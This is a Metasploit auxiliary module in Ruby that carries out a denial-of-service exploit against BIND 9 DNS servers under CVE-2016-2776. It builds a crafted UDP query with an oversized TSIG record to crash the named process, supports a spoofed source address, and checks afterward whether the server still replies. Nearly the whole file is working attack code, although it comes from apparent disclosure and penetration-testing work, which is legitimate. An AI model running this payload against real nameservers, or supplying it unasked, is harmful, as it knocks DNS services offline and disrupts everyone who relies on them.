##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'timeout'
require 'socket'

class MetasploitModule < Msf::Auxiliary
  
  include Msf::Exploit::Capture
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::Dos
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'        => 'BIND 9 DoS CVE-2016-2776',
      'Description' => %q{
          Denial of Service Bind 9 DNS Server CVE-2016-2776.
          Critical error condition which can occur when a nameserver is constructing a response.
          A defect in the rendering of messages into packets can cause named to exit with an
          assertion failure in buffer.c while constructing a response to a query that meets certain criteria.    
          
          This assertion can be triggered even if the apparent source address isnt allowed 
          to make queries.
      },
      # Research and Original PoC - msf module author
      'Author'      => [ 'Martin Rocha', 'Ezequiel Tavella', 'Alejandro Parodi', 'Infobyte Research Team'], 
      'License'     => MSF_LICENSE,
      'References'      =>
        [
          [ 'CVE', '2016-2776' ],
          [ 'URL', 'http://blog.infobytesec.com/2016/09/a-tale-of-packet-cve-2016-2776.html' ]
        ],
      'DisclosureDate' => 'Sep 27 2016',
      {
        'ScannerRecvWindow' => 0
      }
    ))

    register_options([
      Opt::RPORT(53),
      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
    ])
  
    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
  end

  def checkServerStatus(ip, rport)
  	res = ""
  	sudp = UDPSocket.new
	  sudp.send(validQuery, 0, ip, rport)
	  begin 
		  Timeout.timeout(5) do
	    res = sudp.recv(100)
	  end
	  rescue Timeout::Error
	  end

	  if(res.length==0)
      print_good("Exploit Success (Maybe, nameserver did not replied)")
      else
        print_error("Exploit Failed")
    end
  end

  def scan_host(ip)
  	@flag_success = true
  	print_status("Sending bombita (Specially crafted udp packet) to: "+ip)
  	scanner_send(payload, ip, rport)
  	checkServerStatus(ip, rport)
  end

  def getDomain
  	domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
  	org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
  	getDomain = domain+org
  end

  def payload
    query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
    query += "\x00\x00"  # Flags: 0x0000 Standard query
    query += "\x00\x01"  # Questions: 1
    query += "\x00\x00"  # Answer RRs: 0
    query += "\x00\x00"  # Authority RRs: 0
    query += "\x00\x01"  # Additional RRs: 1

    # Doman Name
    query += getDomain   # Random DNS Name
    query += "\x00"      # [End of name]
    query += "\x00\x01"  # Type: A (Host Address) (1)
    query += "\x00\x01"  # Class: IN (0x0001)
    
    # Aditional records. Name
    query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes
    query += "\x3d"+Rex::Text.rand_text_alphanumeric(61)
	  query += "\x00"

    query += "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
    query += "\x00\xff" # Class: ANY (0x00ff)
    query += "\x00\x00\x00\x00" # Time to live: 0
    query += "\x00\xfc" # Data length: 252

    # Algorithm Name
    query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #Random 192 bytes
    query += "\x1A"+Rex::Text.rand_text_alphanumeric(26) #Random 26 bytes
    query += "\x00"

    # Rest of TSIG
    query += "\x00\x00"+Rex::Text.rand_text_alphanumeric(4) # Time Signed: Jan  1, 1970 03:15:07.000000000 ART
    query += "\x01\x2c" # Fudge: 300
    query += "\x00\x10" # MAC Size: 16
    query +=  Rex::Text.rand_text_alphanumeric(16) # MAC
    query += "\x8f\x65" # Original Id: 36709
    query += "\x00\x00" # Error: No error (0)
    query += "\x00\x00" # Other len: 0
  end

  def validQuery
  	query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
    query += "\x00\x00"  # Flags: 0x0000 Standard query
    query += "\x00\x01"  # Questions: 1
    query += "\x00\x00"  # Answer RRs: 0
    query += "\x00\x00"  # Authority RRs: 0
    query += "\x00\x00"  # Additional RRs: 0

    # Doman Name
    query += getDomain   # Random DNS Name
    query += "\x00"      # [End of name]
    query += "\x00\x01"  # Type: A (Host Address) (1)
    query += "\x00\x01"  # Class: IN (0x0001)s
  end

end

